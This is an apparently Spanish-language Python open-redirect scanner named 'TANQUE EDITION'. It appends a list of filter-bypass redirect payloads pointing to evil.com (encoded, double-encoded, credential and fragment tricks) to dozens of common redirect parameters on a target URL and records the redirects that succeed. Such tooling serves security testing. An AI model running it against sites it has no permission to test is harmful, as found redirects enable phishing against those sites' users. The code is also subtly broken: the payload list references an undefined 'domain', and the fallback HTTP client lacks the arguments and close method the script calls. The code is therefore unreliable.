#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
OPEN REDIRECT v2.0 - TANQUE EDITION
Detección de Open Redirect · Bypass de filtros · 50+ payloads · Validación
"""

import asyncio
import random
from urllib.parse import urlparse, urljoin, quote
from typing import Dict, List, Optional

try:
    from http_client import HTTPClient
except ImportError:
    class HTTPClient:
        async def __aenter__(self): return self
        async def __aexit__(self, *args): pass
        async def get(self, url, allow_redirects=False): return None

class OpenRedirect:
    def __init__(self, url: str, aggressive: bool = False):
        self.url = url.rstrip('/')
        self.parsed = urlparse(url)
        self.domain = self.parsed.netloc
        self.aggressive = aggressive
        self.client = None
        self.findings = []
        
        # Parámetros vulnerables
        self.vulnerable_params = [
            'url', 'redirect', 'redirect_uri', 'redirect_url', 'return',
            'return_to', 'return_url', 'return_uri', 'next', 'next_url',
            'next_uri', 'redir', 'redir_url', 'redirect_to', 'out',
            'view', 'dir', 'location', 'dest', 'destination', 'go',
            'link', 'goto', 'target', 'r', 'u', 'path', 'continue',
            'continue_to', 'return_path', 'success_url', 'failure_url',
            'callback', 'callback_url', 'redirect_uri', 'redirect_urL',
        ]
        
        # Payloads Open Redirect
        self.payloads = [
            # Básicos
            ('https://evil.com', 'basic_https'),
            ('http://evil.com', 'basic_http'),
            ('//evil.com', 'protocol_relative'),
            ('\\\\evil.com', 'windows_unc'),
            
            # ByPass de filtros
            ('https:evil.com', 'no_slash'),
            ('https:/evil.com', 'single_slash'),
            ('https:\\\\evil.com', 'backslashes'),
            ('https://evil.com@good.com', 'credentials'),
            ('https://good.com@evil.com', 'credentials_rev'),
            ('https://evil.com#good.com', 'fragment'),
            ('https://evil.com?good.com', 'query'),
            ('https://evil.com\\@good.com', 'backslash_at'),
            
            # Codificados
            ('https%3A%2F%2Fevil.com', 'urlencoded_full'),
            ('%68%74%74%70%73%3A%2F%2Fevil.com', 'hex_encoded'),
            ('https://evil%2Ecom', 'encoded_dot'),
            
            # Doble codificado
            ('https%253A%252F%252Fevil.com', 'double_encoded'),
            
            # Con subdominios
            ('https://evil.com.' + domain, 'subdomain_dot'),
            ('https://evil.com@' + domain, 'credentials_domain'),
            ('https://' + domain + '.evil.com', 'subdomain_evil'),
            
            # Path traversal
            ('/https://evil.com', 'slash_prefix'),
            ('https://evil.com/../good', 'path_traversal'),
            ('https://evil.com;good.com', 'semicolon'),
            
            # Caracteres especiales
            ('https://evil.com/?', 'question_mark'),
            ('https://evil.com/#', 'hash_only'),
            ('https://evil.com/?/good.com', 'query_slash'),
        ]
        
        # Patrones de bypass adicionales
        self.bypass_patterns = [
            ('https://evil.com', 'evil.com', 'basic'),
            ('https://evil.com@good.com', 'good.com', 'credentials'),
            ('https://evil.com#good.com', 'good.com', 'fragment'),
            ('https://evil.com?good.com', 'good.com', 'query'),
        ]
        
    async def setup(self):
        """Inicializa cliente HTTP"""
        self.client = HTTPClient(timeout=10, max_retries=2)
        
    def extract_params(self) -> List[str]:
        """Extrae parámetros de la URL"""
        params = []
        if '?' in self.url:
            query = self.url.split('?')[1]
            for param in query.split('&'):
                if '=' in param:
                    params.append(param.split('=')[0])
                    
        # Añadir parámetros vulnerables
        params.extend(self.vulnerable_params)
        return list(set(params))
        
    def build_test_url(self, param: str, payload: str) -> str:
        """Construye URL de prueba"""
        if '?' in self.url:
            # Reemplazar o añadir parámetro
            query_parts = self.url.split('?')[1].split('&')
            new_query = []
            replaced = False
            
            for part in query_parts:
                if part.startswith(f"{param}="):
                    new_query.append(f"{param}={quote(payload)}")
                    replaced = True
                else:
                    new_query.append(part)
                    
            if not replaced:
                new_query.append(f"{param}={quote(payload)}")
                
            return f"{self.url.split('?')[0]}?{'&'.join(new_query)}"
        else:
            return f"{self.url}?{param}={quote(payload)}"
            
    def is_redirect_to_evil(self, location: str, payload: str) -> bool:
        """Verifica si la redirección va al dominio evil"""
        if not location:
            return False
            
        # Extraer dominio evil del payload
        evil_domains = ['evil.com', 'evil.org', 'evil.net', 'attacker.com']
        
        for evil in evil_domains:
            if evil in location.lower():
                return True
                
        return False
        
    async def test_param(self, param: str, payload: tuple) -> Optional[Dict]:
        """Prueba un parámetro con un payload"""
        payload_str, payload_name = payload
        
        test_url = self.build_test_url(param, payload_str)
        
        try:
            resp = await self.client.get(test_url, allow_redirects=False)
            
            if not resp:
                return None
                
            status = resp.status
            location = resp.headers.get('location', '')
            
            # Verificar si es redirección a evil
            if status in [301, 302, 303, 307, 308] and location:
                if self.is_redirect_to_evil(location, payload_str):
                    return {
                        'type': 'OPEN_REDIRECT',
                        'param': param,
                        'payload': payload_str,
                        'payload_name': payload_name,
                        'url': test_url,
                        'location': location,
                        'status': status,
                        'severity': 'CRITICO'
                    }
                    
            # Verificar si el payload se refleja
            if self.aggressive:
                if payload_str in str(resp.url) or payload_str in location:
                    return {
                        'type': 'OPEN_REDIRECT_REFLECTED',
                        'param': param,
                        'payload': payload_str,
                        'payload_name': payload_name,
                        'url': test_url,
                        'status': status,
                        'severity': 'ALTO'
                    }
                    
        except Exception as e:
            pass
        return None
        
    async def scan(self):
        """Ejecuta escaneo de Open Redirect"""
        print(f"\n🔄 OPEN REDIRECT v2.0 TANQUE - {self.url}")
        print("=" * 70)
        
        await self.setup()
        
        try:
            params = self.extract_params()
            print(f"[*] Probando {len(params)} parámetros con {len(self.payloads)} payloads")
            print("-" * 70)
            
            for param in params:
                print(f"\n[*] Probando parámetro: {param}")
                
                for payload in self.payloads:
                    result = await self.test_param(param, payload)
                    
                    if result:
                        self.findings.append(result)
                        print(f"   [[CRITICO]] {result['payload_name']}: {result['url']}")
                        print(f"        ↳ Redirige a: {result.get('location', 'N/A')}")
                        break  # No seguir con más payloads para este parámetro
                        
                    await asyncio.sleep(random.uniform(0.2, 0.5))
                    
            # Resumen
            print("\n" + "="*70)
            print("📊 RESULTADOS OPEN REDIRECT")
            print("="*70)
            
            if self.findings:
                print(f"\n[CRITICO] VULNERABILIDADES: {len(self.findings)}")
                for f in self.findings:
                    print(f"   • {f['param']} → {f['location']}")
                    
                # Guardar resultados
                with open(f"open_redirect_{self.domain}.txt", 'w') as f:
                    for finding in self.findings:
                        f.write(f"{finding['url']} → {finding['location']}\n")
                print(f"\n💾 Resultados guardados en open_redirect_{self.domain}.txt")
            else:
                print("\n[OK] No se detectaron Open Redirects")
                
        finally:
            if self.client:
                await self.client.close()
                
        return self.findings

async def main():
    import sys
    if len(sys.argv) < 2:
        print("Uso: python3 open_redirect.py <URL> [--aggressive]")
        sys.exit(1)
        
    url = sys.argv[1]
    aggressive = '--aggressive' in sys.argv
    
    scanner = OpenRedirect(url, aggressive)
    await scanner.scan()

if __name__ == "__main__":
    asyncio.run(main())
